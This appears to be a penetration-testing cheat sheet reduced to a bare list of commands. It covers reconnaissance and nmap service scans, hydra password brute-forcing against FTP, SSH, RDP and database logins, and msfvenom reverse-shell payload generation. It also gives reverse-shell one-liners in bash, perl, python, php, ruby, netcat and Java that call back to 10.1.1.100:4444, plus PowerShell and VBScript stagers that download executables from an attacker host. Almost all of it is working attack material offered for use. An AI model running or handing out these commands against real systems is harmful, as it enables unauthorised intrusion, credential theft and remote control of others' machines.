["```\nwhois domain-name.com\n```", "```\ndnsenum domain-name.com\nfierce -dns domain-name.com\ndnsrecon -w -d domain-name.com -t axfr\n\n-w: will perform a deep whois analysis\n-d: target domain name\n-t: type of enumeration\naxfr: Test all NS servers for a zone transfer\n```", "```\ntheharvester -d domain-name.com -l 500 -b google -h \n-d: is for the domain name\n-l: in this case to limit the number of results to 100\n-b: stands for the datasource, in this case we have chosen google but you have more options like (google,bing,bingapi,pgp,linkedin,google-profiles,people123,jigsaw,all)\n-h: will use the SHODAN database to query the discovered hosts\n```", "```\nnmap -sn [IP Address / range]\n```", "```\nnetdiscover -r [IP Address / range]\n```", "```\nnmap -sS -sV -sC -sV --version-all -O --osscan-guess -T4 --reason --open -p- -Pn -v [IP address / range]\n```", "```\nnmap -sU --top-ports 1000 -Pn -v [IP address / range]\n```", "```\nnmap -sS -T2 --top-ports 1000 -Pn -v [IP address / range]\n```", "```\nnmap -sU --top-ports 100 -Pn -v [IP address / range]\n```", "```\nnmap -sV -p 21 -Pn -T5 --host-timeout 15m --script=ftp* -v [IP address]\n```", "```\nhydra -t 10 -V -f -L [users dic file path] -P [passwords dic file path] ftp://[IP address]\n```", "```\nnmap -sV -p 22 -Pn -T5 --host-timeout 15m --script=ssh* -v [IP address]\n```", "```\nhydra -t 10 -V -f -L [users dic file path] -P [passwords dic file path] ssh://[IP address]\n```", "```\nnmap -sV -p 23 -Pn -T5 --host-timeout 15m --script=telnet* -v [IP address]\n```", "```\nhydra -t 10 -V -f -L [users dic file path] -P [passwords dic file path] telnet://[IP address]\n```", "```\nnmap -sV -p 25 -Pn -T5 --host-timeout 15m --script=smtp* -v [IP address]\n```", "```\ntelnet [IP] 25\nThen execute the command once connected:\nVRFY [user] (e.g. VRFY John)\n```", "```\nnmap -sV -p 53 -Pn -T5 --host-timeout 15m --script=dns* -v [IP address]\n```", "```\nnmap -sV -p 80 -Pn -T5 --host-timeout 200m --script=http* -v [IP address]\n```", "```\nnikto -host http://[IP address]\n```", "```\nwhatweb [IP address]\n```", "```\ngobuster -u http://[IP address]-w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,403,500' -e\n```", "```\nnmap -sV -p 110 -Pn -T5 --host-timeout 15m --script=pop3* -v [IP address]\n```", "```\nnmap -sV -p 139,445 -Pn -T5 --host-timeout 200m --script=smb* -v [IP address]\n```", "```\nenum4linux -a [IP address]\n```", "```\nnmblookup -A [IP address]\n```", "```\nnbtscan -r [IP address]\n```", "```\nsmbclient -L [IP address] -N\n```", "```\nsmbclient //[IP address]/[Shared directory]\n```", "```\nnmap -sV -p 161 -Pn -T5 --host-timeout 15m --script=snmp* -v [IP address]\n```", "```\nsnmpwalk -c public -v1 [IP address]\n```", "```\nsnmp-check -t [IP address]\n```", "```\nnmap -sV -p 389 -Pn -T5 --host-timeout 15m --script=ldap* -v [IP address]\n```", "```\nnmap -sV -p 443 -Pn -T5 --host-timeout 15m --script=ssl* -v [IP address]\n```", "```\nnmap -sV -p 1433 -Pn -T5 --host-timeout 15m --script=ms-sql* -v [IP address]\n```", "```\nhydra -t 10 -V -f -L [users dic file path] -P [passwords dic file path] mssql://[IP address]\n```", "```\nnmap -sV -p 3306 -Pn -T5 --host-timeout 15m --script=mysql* -v [IP address]\n```", "```\nhydra -t 10 -V -f -L [users dic file path] -P [passwords dic file path] mysql://[IP address]\n```", "```\nnmap -sV -p 3389 -Pn -T5 --host-timeout 15m --script=rdp* -v [IP address]\n```", "```\nhydra -t 10 -V -f -L [users dic file path] -P [passwords dic file path] rdp://[IP address]\n```", "```\nuse exploit/multi/handler set PAYLOAD [msfvenom Payload name] set LHOST [Kali IP address] set LPORT [Listening port on Kali] set ExitOnSession false exploit -j -z\n```", "```\nnc -nlvp [listening port on Kali]\n```", "```\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[Your Kali IP Address] LPORT=[Your Listening Port on Kali] -f elf > linux_shell.elf\n```", "```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your Kali IP Address] LPORT=[Your Listening Port on Kali] -f exe > windows_shell.exe\n```", "```\nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=[Your Kali IP Address] LPORT=[Your Listening Port on Kali] -f macho > mac_shell.macho\n```", "```\nmsfvenom -p php/meterpreter/reverse_tcp LHOST=[Your Kali IP Address] LPORT=[Your Listening Port on Kali] -f raw > php_shell.php\n```", "```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your Kali IP Address] LPORT=[Your Listening Port on Kali] -f asp > asp_shell.asp\n```", "```\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=[Your Kali IP Address] LPORT=[Your Listening Port on Kali] -f raw > jsp_shell.jsp\n```", "```\nbash -i >& /dev/tcp/[Your Kali IP Address]/[Your Listening Port on Kali] 0>&1\n```", "```\nperl -e 'use Socket;$ip=\"10.1.1.100\";$prt=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($prt,inet_aton($ip)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n```", "```\npython -c 'import socket,subprocess,os;skt=socket.socket(socket.AF_INET,socket.SOCK_STREAM);skt.connect((\"10.1.1.100\",4444));os.dup2(skt.fileno(),0); os.dup2(skt.fileno(),1); os.dup2(skt.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n```", "```\nphp -r '$sock=fsockopen(\"10.1.1.100\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n```", "```\nruby -rsocket -e'f=TCPSocket.open(\"10.1.1.100\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\n```", "```\nnc -e /bin/sh 10.1.1.100 4444\n```", "```\nrt = Runtime.getRuntime()\npc = rt.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.1.1.100/4444;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\npc.waitFor()\n```", "```\necho $storageDir = $pwd > wget_win.ps1\necho $webclient = New-Object System.Net.WebClient >>wget_win.ps1\necho $url = \"http://[kali IP]/file name\" >>wget_win.ps1\necho $file = \"get-admin.exe\" >>wget_win.ps1\necho $webclient.DownloadFile($url,$file) >>wget_win.ps1\n```", "```\npowershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget_win.ps1\n```", "```\necho strUrl = WScript.Arguments.Item(0) > wget_win.vbs\necho StrFile = WScript.Arguments.Item(1) >> wget_win.vbs\necho Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget_win.vbs\necho Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget_win.vbs\necho Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget_win.vbs\necho Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget_win.vbs\necho Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget_win.vbs\necho Err.Clear >> wget_win.vbs\necho Set http = Nothing >> wget_win.vbs\necho Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> wget_win.vbs\necho If http Is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\") >> wget_win.vbs\necho If http Is Nothing Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\") >> wget_win.vbs\necho If http Is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\") >> wget_win.vbs\necho http.Open \"GET\", strURL, False >> wget_win.vbs\necho http.Send >> wget_win.vbs\necho varByteArray = http.ResponseBody >> wget_win.vbs\necho Set http = Nothing >> wget_win.vbs\necho Set fs = CreateObject(\"Scripting.FileSystemObject\") >> wget_win.vbs\necho Set ts = fs.CreateTextFile(StrFile, True) >> wget_win.vbs\necho strData = \"\" >> wget_win.vbs\necho strBuffer = \"\" >> wget_win.vbs\necho For lngCounter = 0 to UBound(varByteArray) >> wget_win.vbs\necho ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget_win.vbs\necho Next >> wget_win.vbs\necho ts.Close >> wget_win.vbs\n```", "```\ncscript wget_win.vbs http://[Kali IP address]/[File Name] get-admin.exe\n```", "```\nmeterpreter > getsystem\n```"]